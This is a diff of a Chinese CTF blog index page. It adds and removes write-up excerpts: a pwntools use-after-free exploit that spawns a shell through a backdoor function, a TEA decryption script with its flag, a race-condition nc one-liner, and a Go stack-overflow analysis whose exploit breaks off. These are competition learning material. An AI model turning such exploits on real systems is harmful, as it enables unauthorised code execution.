@@ -131,6 +131,159 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2023/06/19/NISACTF2022-uaf-wp/" >NISACTF2022-uaf-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-06-19
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/19/NISACTF2022-uaf-wp">相关资源</a>  </p>
+<h2 id="0x1-分析"><a href="#0x1-分析" class="headerlink" title="0x1 分析"></a>0x1 分析</h2><ul>
+<li>PIE未开</li>
+<li>free完没有置空，存在uaf漏洞</li>
+<li>存在后门函数<code>NICO(char* command)</code>，执行<code>system(command)</code>;</li>
+<li>page为结构体指针数组  结构体组成：char str[4] 和 void* func (各为32位)</li>
+<li>show(0) 会执行 (page[0]-&gt;func)(page[0]-&gt;str)</li>
+</ul>
+<h2 id="0x2-思路"><a href="#0x2-思路" class="headerlink" title="0x2 思路"></a>0x2 思路</h2><ul>
+<li>create page[0]</li>
+<li>del page[0]</li>
+<li>create page[1] （此时page[0]和page[1]相同，指向相同空间）</li>
+<li>edit page[1] —-&gt;  ‘sh\0\0’+p32(NICO)   (即修改了page[0])</li>
+<li>show(0)</li>
+</ul>
+<h2 id="0x3-exp"><a href="#0x3-exp" class="headerlink" title="0x3 exp"></a>0x3 exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">pty = process.PTY</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">proc = process(<span class="string">&quot;./bin&quot;</span>, stdin=pty, stdout=pty)</span><br><span class="line"><span class="comment"># proc = remote(&quot;node4.anna.nssctf.cn&quot;, 28035)</span></span><br><span class="line">belf = ELF(<span class="string">&quot;./bin&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">x</span>): proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ga</span>(): <span class="keyword">return</span> u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dlt</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;page\n&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shw</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;page\n&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edt</span>(<span class="params">idx, con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;page\n&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;strings\n&#x27;</span>, con)</span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b main</span></span><br><span class="line"><span class="string">    b create</span></span><br><span class="line"><span class="string">    b del</span></span><br><span class="line"><span class="string">    b show</span></span><br><span class="line"><span class="string">    b edit</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(proc, gdbscript=gscript)</span></span><br><span class="line"></span><br><span class="line">NICO_addr = <span class="number">0x08048642</span></span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">dlt(<span class="number">0</span>)</span><br><span class="line">add()</span><br><span class="line">edt(<span class="number">1</span>, <span class="string">b&#x27;sh\x00\x00&#x27;</span>+p32(NICO_addr))</span><br><span class="line">shw(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">pi()</span><br><span class="line">pause()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+	
+	</div>
+  <a type="button" href="/2023/06/19/NISACTF2022-uaf-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
+									<a href="/2023/06/17/GDOUCTF2023-tea-wp/" >GDOUCTF2023-tea-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-06-17
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/17/GDOUCTF2023-tea-wp">相关资源</a></p>
+<h2 id="0x1-分析"><a href="#0x1-分析" class="headerlink" title="0x1 分析"></a>0x1 分析</h2><ul>
+<li>Shift+F12 查看字符串，追寻到 “you are right.”的使用处， 发现核心处理代码</li>
+</ul>
+<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/17/GDOUCTF2023-tea-wp/0x1.png?raw=true" alt="img">   </p>
+<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/17/GDOUCTF2023-tea-wp/0x2.png?raw=true" alt="img">   </p>
+<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/17/GDOUCTF2023-tea-wp/0x3.png?raw=true" alt="img">    </p>
+<ul>
+<li><p>进入查看发现35行 <code>sub_140011339</code>  将key置为[2233,4455,6677,8899]</p>
+</li>
+<li><p>36行 <code>sub_140011145</code> 将input复制到v9， 无用</p>
+</li>
+<li><p>37行 <code>sub_1400112B7</code> 利用input和key执行核心加密算法，且可逆向</p>
+<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/17/GDOUCTF2023-tea-wp/0x4.png?raw=true" alt="img">    </p>
+</li>
+<li><p>38行 <code>sub_140011352</code> 检查结果</p>
+<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/17/GDOUCTF2023-tea-wp/0x5.png?raw=true" alt="img"></p>
+</li>
+</ul>
+<h2 id="0x2-逆向脚本"><a href="#0x2-逆向脚本" class="headerlink" title="0x2 逆向脚本"></a>0x2 逆向脚本</h2><p>逆写算法就可以，注意循环下标也要逆序</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> a1[]= &#123;<span class="number">0x1A800BDA</span>, <span class="number">0xF7A6219B</span>, <span class="number">0x491811D8</span>, <span class="number">0xF2013328</span>, <span class="number">0x156C365B</span>, <span class="number">0x3C6EAAD8</span>, <span class="number">0x84D4BF28</span>, <span class="number">0xF11A7EE7</span>, <span class="number">0x3313B252</span>, <span class="number">0xDD9FE279</span> &#125;;</span><br><span class="line">	<span class="type">int</span> a2[]=&#123;<span class="number">2233</span>,<span class="number">4455</span>,<span class="number">6677</span>,<span class="number">8899</span>&#125;;</span><br><span class="line">	<span class="type">int</span> v3,v5,v6;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">8</span>; i &gt;= <span class="number">0</span>; i-- ) &#123;</span><br><span class="line">		v5 = <span class="number">0</span>;</span><br><span class="line">		v6 = <span class="number">256256256</span> * i;</span><br><span class="line">		v3 = i + <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;=<span class="number">0x20</span>; j++) &#123;</span><br><span class="line">			v6+=<span class="number">256256256</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			++v5;</span><br><span class="line">			v6 -= <span class="number">256256256</span>;</span><br><span class="line">			a1[v3] -= (v6 + a2[(v6 &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]) ^ (a1[i] + ((a1[i] &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * a1[i])));</span><br><span class="line">			a1[i] -= v6 ^ (a1[v3] + ((a1[v3] &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * a1[v3]))) ^ (v6 + a2[v6 &amp; <span class="number">3</span>]);</span><br><span class="line">		&#125; <span class="keyword">while</span> ( v5 &lt;= <span class="number">0x20</span> );</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%#x &quot;</span>,a1[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/17/GDOUCTF2023-tea-wp/0x6.png?raw=true" alt="img">    </p>
+<p>HZCTF{hzCtf_94_re666fingcry5641qq}</p>
+
+	
+	</div>
+  <a type="button" href="/2023/06/17/GDOUCTF2023-tea-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
+									<a href="/2023/06/15/zer0pts2020-easystrcmp-wp/" >zer0pts2020-easystrcmp-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-06-15
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/15/zer0pts2020-easystrcmp-wp">相关资源</a>  </p>
+<h2 id="0x1-分析"><a href="#0x1-分析" class="headerlink" title="0x1 分析"></a>0x1 分析</h2><p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/15/zer0pts2020-easystrcmp-wp/0x1.jpg?raw=true" alt="img">  </p>
+
+	
+	</div>
+  <a type="button" href="/2023/06/15/zer0pts2020-easystrcmp-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
+									<a href="/2023/06/13/NISACTF2022-shoppwn-wp/" >NISACTF2022-shoppwn-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-06-13
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/13/NISACTF2022-shoppwn-wp">相关资源</a>  </p>
+<h2 id="0x1-分析"><a href="#0x1-分析" class="headerlink" title="0x1 分析"></a>0x1 分析</h2><p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/13/NISACTF2022-shoppwn-wp/0x1.png?raw=true" alt="img"><br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/13/NISACTF2022-shoppwn-wp/0x2.png?raw=true" alt="img"><br>sell的时候使用pthread_create，其中有usleep，只要发送速度足够快，可以卖出两次</p>
+<h2 id="0x2-exp"><a href="#0x2-exp" class="headerlink" title="0x2 exp"></a>0x2 exp</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo -e &#x27;3\n0\n3\n0\n2\n1\n1\n&#x27; | nc node3.anna.nssctf.cn 28736</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sell pen</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sell pen</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">buy flag</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">show</span></span><br></pre></td></tr></table></figure>
+	
+	</div>
+  <a type="button" href="/2023/06/13/NISACTF2022-shoppwn-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2023/06/13/GDOUCTF2023-easymath-wp/" >GDOUCTF2023-小学数学-wp</a>
 								</h3>
 							</div>
@@ -319,291 +472,6 @@
 </div>
 
 		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/06/01/ida-gdb/" >IDA远程连接gdb调试</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-06-01
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h2 id="0x1-linux-下载-gdbserver"><a href="#0x1-linux-下载-gdbserver" class="headerlink" title="0x1 linux 下载 gdbserver"></a>0x1 linux 下载 <code>gdbserver</code></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gdbserver</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x2-启动-gdbserver"><a href="#0x2-启动-gdbserver" class="headerlink" title="0x2 启动 gdbserver"></a>0x2 启动 <code>gdbserver</code></h2><p>9999为你指定的端口号  bin为你想要调试的可执行文件</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdbserver 0.0.0.0:9999 ./bin</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x3-IDA配置"><a href="#0x3-IDA配置" class="headerlink" title="0x3 IDA配置"></a>0x3 IDA配置</h2><p>选择工具栏 Debugger -&gt; Select debugger 或直接在图标导航栏<br>选择 <code>Remote GDB Debugger</code><br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/01/ida-gdb/0x3.png?raw=true" alt="img"><br>按F9调试，显示配置信息<br><code>parameters</code>为程序执行所需要的参数 没有则不填<br><code>hostname</code>填gdbserver运行所在的ip，若是本机则为127.0.0.1，若是虚拟机或其他，需查看ip地址再填入<br><code>port</code>为刚刚gdbserver运行指定的端口号<br>点击OK  即可进入调试<br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/01/ida-gdb/0x3-2.png?raw=true" alt="img"></p>
-<h2 id="0x4-调试执行方法-x2F-快捷键"><a href="#0x4-调试执行方法-x2F-快捷键" class="headerlink" title="0x4 调试执行方法&#x2F;快捷键"></a>0x4 调试执行方法&#x2F;快捷键</h2><p>可参考<code>Debugger</code>工具栏下的各调试命令<br>F7 单步进入<br>F8 单步跳过<br>F4 执行到断点<br>F9 开始调试<br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/01/ida-gdb/0x3-3.png?raw=true" alt="img"></p>
-
-	
-	</div>
-  <a type="button" href="/2023/06/01/ida-gdb/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/05/31/shellwego-wp/" >ciscn2023 shellwego writeup</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-05-31
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p>这题是go语言程序 感觉逆向的占比大于pwn…</p>
-<h2 id="0x1-checksec-查看安全保护"><a href="#0x1-checksec-查看安全保护" class="headerlink" title="0x1 checksec 查看安全保护"></a>0x1 checksec 查看安全保护</h2><p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/05/31/shellwego-wp/checksec.png?raw=true" alt="img"><br>没开PIE， 而且可以发现程序是静态链接的</p>
-<h2 id="0x2-ida-分析"><a href="#0x2-ida-分析" class="headerlink" title="0x2 ida 分析"></a>0x2 ida 分析</h2><p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/05/31/shellwego-wp/0x2.png?raw=true" alt="img"></p>
-<p>无符号表，难以分析，尝试利用</p>
-<h2 id="0x3-恢复符号表"><a href="#0x3-恢复符号表" class="headerlink" title="0x3 恢复符号表"></a>0x3 恢复符号表</h2><h3 id="0x3-1-查看程序go版本"><a href="#0x3-1-查看程序go版本" class="headerlink" title="0x3-1 查看程序go版本"></a>0x3-1 查看程序go版本</h3><p>两种方式： </p>
-<ol>
-<li>Shift+F12打开字符串窗口，搜索<code>go</code> 可以看到版本信息</li>
-<li>在命令行执行 <code>strings shellwego | grep &quot;go&quot;</code></li>
-</ol>
-<p>可以看到版本为go1.20.4<br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/05/31/shellwego-wp/0x3-1.png?raw=true" alt="img"></p>
-<h3 id="0x3-2-尝试利用IDA-signature库进行比对恢复"><a href="#0x3-2-尝试利用IDA-signature库进行比对恢复" class="headerlink" title="0x3-2 尝试利用IDA signature库进行比对恢复"></a>0x3-2 尝试利用IDA signature库进行比对恢复</h3><blockquote>
-<p>IDA 可以根据选定signature库中的函数签名特征与当前程序各函数进行匹配  从而恢复函数名</p>
-</blockquote>
-<ol>
-<li>Shift+F5打开Signatures窗口</li>
-<li>右键点击 <code>Apply new signature...</code></li>
-<li>点击 <code>Search</code> 搜索 <code>go</code></li>
-<li>发现只有一个 <code>go_std</code> 仅可用于 <code>go1.10-1.16</code>， 不可行<br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/05/31/shellwego-wp/0x3-2.png?raw=true" alt="img"></li>
-</ol>
-<h3 id="0x3-3-搜索-ida-go1-20-signature"><a href="#0x3-3-搜索-ida-go1-20-signature" class="headerlink" title="0x3-3 搜索 ida go1.20 signature"></a>0x3-3 搜索 <code>ida go1.20 signature</code></h3><p>发现工具 <a target="_blank" rel="noopener" href="https://www.google.com.hk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjk55Gv_qD_AhWgcGwGHSR4BicQFnoECBQQAQ&url=https://github.com/mandiant/GoReSym&usg=AOvVaw1kELKyeJ37LXczOk3Yd8pk">GoReSym</a> （也可以试试其他符号恢复方法）</p>
-<p>使用：</p>
-<ol>
-<li>下载程序 <a target="_blank" rel="noopener" href="https://github.com/mandiant/GoReSym/releases/">Release</a></li>
-<li>执行并生成结果json文件  <code>GoReSym.exe -t -d -p /path/to/shellwego &gt; output.json</code></li>
-<li>下载IDA脚本文件 <a target="_blank" rel="noopener" href="https://github.com/mandiant/GoReSym/blob/master/IDAPython/goresym_rename.py">goresym_rename.py</a></li>
-<li>IDA 点击 File -&gt; Script File 选择 <code>goresym_rename.py</code> 再选择刚才输出的 <code>output.json</code> IDA就能自动恢复函数名了</li>
-</ol>
-<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/05/31/shellwego-wp/0x3-3.png?raw=true" alt="img"></p>
-<p>前后对比可以看到恢复效果非常理想</p>
-<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/05/31/shellwego-wp/0x3-32.png?raw=true" alt="img"></p>
-<h2 id="0x4-程序分析"><a href="#0x4-程序分析" class="headerlink" title="0x4 程序分析"></a>0x4 程序分析</h2><h3 id="0x4-1-进入main-main函数，可以看到程序先输出-ciscnshell-，再获取输入，然后调用函数-main-unk-func0b05"><a href="#0x4-1-进入main-main函数，可以看到程序先输出-ciscnshell-，再获取输入，然后调用函数-main-unk-func0b05" class="headerlink" title="0x4-1 进入main_main函数，可以看到程序先输出 ciscnshell$，再获取输入，然后调用函数 main_unk_func0b05"></a>0x4-1 进入main_main函数，可以看到程序先输出 <code>ciscnshell$</code>，再获取输入，然后调用函数 <code>main_unk_func0b05</code></h3><p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/05/31/shellwego-wp/0x4-1.png?raw=true" alt="img"></p>
-<h3 id="0x4-2-进入main-unk-func0b05函数"><a href="#0x4-2-进入main-unk-func0b05函数" class="headerlink" title="0x4-2 进入main_unk_func0b05函数"></a>0x4-2 进入<code>main_unk_func0b05</code>函数</h3><ul>
-<li>发现很多cmp和类似字符串16进制的dword<br>点击16进制数再按R键，显示字符串  但由于数据是以dword解释的，所以字符串颠倒  </li>
-<li>尝试执行程序发现输出<code>Cert Is A Must</code> 所以先来看cert命令  按照程序流程可见应该还要输入 <code>nAcDsMic</code>+<code>N</code> 也就是 <code>nAcDsMicN</code>  </li>
-<li>但是如果只输入 <code>cert nAcDsMicN</code> 会出现提示 <code>Missing parameter</code>， 明显是要三个参数  </li>
-<li>再看函数流图发现之后去到函数<code>main_unk_func0b01</code><br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/05/31/shellwego-wp/0x4-2.png?raw=true" alt="img"></li>
-</ul>
-<h3 id="0x4-3-进入main-unk-func0b01函数"><a href="#0x4-3-进入main-unk-func0b01函数" class="headerlink" title="0x4-3 进入main_unk_func0b01函数"></a>0x4-3 进入<code>main_unk_func0b01</code>函数</h3><p>同样方法转换字符串，可以发现大致流程：</p>
-<ol>
-<li>key&#x3D;”F1nallB1B1rd3K3y”</li>
-<li>rc4 加密</li>
-<li>base64 加密</li>
-<li>与字符串”JLIX8pbSvYZu&#x2F;WaG”比较，若相同则认证成功<br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/05/31/shellwego-wp/0x4-3.png?raw=true" alt="img"></li>
-</ol>
-<h3 id="0x4-4-cert-me-in"><a href="#0x4-4-cert-me-in" class="headerlink" title="0x4-4 cert me in"></a>0x4-4 cert me in</h3><p>很明了了，先base64解密成byte数组， 再用已知key通过rc4解密  最后得到 <code>S33UAga1n@#!</code><br>执行程序输入 <code>cert nAcDsMicN S33UAga1n@#!</code>， 成功通过验证</p>
-<h3 id="0x4-5-回到main-unk-func0b05函数"><a href="#0x4-5-回到main-unk-func0b05函数" class="headerlink" title="0x4-5 回到main_unk_func0b05函数"></a>0x4-5 回到<code>main_unk_func0b05</code>函数</h3><p>尝试执行函数中提到的不同命令，可以<code>cat flag</code>但是是假的flag<br>发现仅echo命令存在可能漏洞（main_unk_func0b04中）</p>
-<h3 id="0x4-6-进入main-unk-func0b04函数"><a href="#0x4-6-进入main-unk-func0b04函数" class="headerlink" title="0x4-6 进入main_unk_func0b04函数"></a>0x4-6 进入<code>main_unk_func0b04</code>函数</h3><p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/05/31/shellwego-wp/0x4-4.png?raw=true" alt="img"><br>结合动态调试发现：</p>
-<ol>
-<li>echo后面的单个连续单词长度不能超过0x200</li>
-<li>单词会去掉空格拼接起来复制到栈上， 存在栈溢出漏洞</li>
-<li>遇到<code>+</code>不复制</li>
-</ol>
-<h2 id="0x5-exploit"><a href="#0x5-exploit" class="headerlink" title="0x5 exploit"></a>0x5 exploit</h2><p>直接栈溢出到ret_addr会出现Segmentation Fault，调试分析问题出现在指令<code>movzx edx, byte ptr [rbx+rax]</code><br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/05/31/shellwego-wp/0x4-5.png?raw=true" alt="img"></p>
-<p>原因rbx从栈上取了一个地址值，而我们改写了栈使其不再是有效地址值，所以解析的时候会报段错误<br>绕开方式： 刚好遇到 <code>+</code> 不会复制，也就保留原来的值</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;./shellwego&#x27;</span></span><br><span class="line">proc = process(filename)</span><br><span class="line">belf = ELF(filename)</span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b * 0x0000000004C1882</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(proc, gdbscript=gscript)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gadget 